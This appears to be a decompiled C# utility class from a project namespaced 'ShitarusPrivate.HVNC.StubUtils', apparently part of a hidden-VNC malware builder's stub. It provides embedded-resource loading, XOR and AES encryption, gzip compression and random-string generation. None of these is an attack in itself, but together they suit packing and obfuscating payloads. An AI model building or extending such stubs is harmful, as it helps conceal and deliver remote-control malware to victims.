using System;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;

namespace ShitarusPrivate.HVNC.StubUtils
{
    public class Utils
    {
        [CompilerGenerated]
        private sealed class __c__DisplayClass4_0
        {
            public Random rng;

            internal char _RandomString_b__0(string s)
            {
                return s[rng.Next(s.Length)];
            }
        }

        public static byte[] GetEmbeddedResource(string name)
        {
            Assembly executingAssembly = Assembly.GetExecutingAssembly();
            MemoryStream memoryStream = new MemoryStream();
            Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(name);
            manifestResourceStream.CopyTo(memoryStream);
            manifestResourceStream.Dispose();
            byte[] result = memoryStream.ToArray();
            memoryStream.Dispose();
            return result;
        }

        public static string GetEmbeddedString(string name)
        {
            Assembly executingAssembly = Assembly.GetExecutingAssembly();
            StreamReader streamReader = new StreamReader(executingAssembly.GetManifestResourceStream(name));
            string result = streamReader.ReadToEnd();
            streamReader.Close();
            streamReader.Dispose();
            return result;
        }

        public static byte[] Encrypt(EncryptionMode type, byte[] input, byte[] key, byte[] iv)
        {
            switch (type)
            {
                default:
                    return null;
                case EncryptionMode.XOR:
                {
                    for (int i = 0; i < input.Length; i++)
                    {
                        input[i] = (byte)(input[i] ^ key[i % key.Length]);
                    }
                    return input;
                }
                case EncryptionMode.AES:
                {
                    AesManaged aesManaged = new AesManaged();
                    aesManaged.Mode = CipherMode.CBC;
                    aesManaged.Padding = PaddingMode.PKCS7;
                    ICryptoTransform cryptoTransform = aesManaged.CreateEncryptor(key, iv);
                    byte[] result = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
                    cryptoTransform.Dispose();
                    aesManaged.Dispose();
                    return result;
                }
            }
        }

        public static byte[] Compress(byte[] bytes)
        {
            MemoryStream memoryStream = new MemoryStream(bytes);
            MemoryStream memoryStream2 = new MemoryStream();
            GZipStream gZipStream = new GZipStream(memoryStream2, CompressionMode.Compress);
            memoryStream.CopyTo(gZipStream);
            gZipStream.Dispose();
            memoryStream2.Dispose();
            memoryStream.Dispose();
            return memoryStream2.ToArray();
        }

        public static string RandomString(int length, Random rng)
        {
            __c__DisplayClass4_0 _c__DisplayClass4_ = new __c__DisplayClass4_0();
            _c__DisplayClass4_.rng = rng;
            string element = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            return new string(Enumerable.Repeat(element, length).Select(_c__DisplayClass4_._RandomString_b__0).ToArray());
        }

        public static bool IsAssembly(string path)
        {
            try
            {
                AssemblyName.GetAssemblyName(path);
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}
